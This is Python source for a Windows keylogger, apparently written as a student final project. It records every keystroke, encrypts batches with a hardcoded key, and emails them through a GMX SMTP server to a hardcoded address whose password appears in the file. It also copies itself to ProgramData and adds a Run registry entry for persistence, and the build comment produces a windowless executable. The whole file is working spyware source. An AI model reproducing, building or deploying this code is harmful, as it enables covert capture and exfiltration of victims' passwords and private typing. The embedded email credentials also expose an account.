# Code by Sergio1260 (sergio00166)
# Code for EDE final proyect
# Group 7 1ºX ASIR
# Generate EXE with pyinstaller --onefile --windowed src

from pynput.keyboard import Listener
from cryptography.fernet import Fernet
from smtplib import SMTP_SSL as SMTP
from email.mime.text import MIMEText
from os import path, environ
from os import system as cmd
from sys import argv
from winreg import HKEY_CURRENT_USER,OpenKey,\
QueryValueEx,SetValueEx,CloseKey,KEY_ALL_ACCESS,REG_SZ

destination = ['awdwada@gmx.es']
USERNAME = "awdwada@gmx.es"
PASSWORD = "Hg*VWa,N~@0'"
clave = b'W3NFJwDhdDLeE48araLk2P_kETmFjPhct-kif7QhgI4='

keys,count = [],0

def cifrar(texto, clave): return Fernet(clave).encrypt(texto)

def sendmsg(USERNAME,PASSWORD,destination,content):
    try:
        # Creamos un objeto MIME para el correo
        msg = MIMEText(content, 'plain')
        # Definimos el campo del sujeto
        msg['Subject']="Keylogger"
        # Definimos el campo que dice quien lo envia
        msg['From'] = USERNAME
        # Creamos una conexion con el servidor SMTP
        conn = SMTP('mail.gmx.com')
        # Lo configuramos sin modo verbose
        conn.set_debuglevel(False)
        # Iniciamos sesion en el servidor
        conn.login(USERNAME, PASSWORD)
        # Enviamos el mensaje
        try: conn.sendmail(USERNAME, destination, msg.as_string())
        finally: conn.quit()
    except: pass


def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    if count >= 64:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    global sender, recipient, clave
    data = []
    for key in keys:
        k = str(key).replace("'", "")
        if k.find('backspace') > 0:
            data.append(' Backspace ')
        elif k.find('enter') > 0:
            data.append('\n')
        elif k.find('shift') > 0:
            data.append(' Shift ')
        elif k.find('space') > 0:
            data.append(' ')
        elif k.find('caps_lock') > 0:
            data.append(' caps_lock ')
        elif k.find('Key'):
            data.append(k)

    # Mandamos correo
    data = "".join(data).encode("UTF-8")
    data = cifrar(data, clave).decode("UTF-8")
    sendmsg(USERNAME,PASSWORD,destination,data)


def add_to_startup():
    script_path = path.realpath(argv[0])
    bat_path = "C:\\ProgramData\\klg.exe"
    # Copy itself to the specified path
    cmd(f'copy "{script_path}" "{bat_path}"')
    # Create the batch file to run the script
    key = HKEY_CURRENT_USER
    key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    entry_name = "klgxd"

    try:
        open_key = OpenKey(key, key_value, 0, KEY_ALL_ACCESS)
        try:
            value, _ = QueryValueEx(open_key, entry_name)
            if not value == bat_path: SetValueEx(open_key, entry_name, 0, REG_SZ, bat_path)
        except FileNotFoundError: SetValueEx(open_key, entry_name, 0, REG_SZ, bat_path)
        finally: CloseKey(open_key)
    except: pass


if __name__=="__main__":
    add_to_startup()
    Listener(on_press=on_press).join()
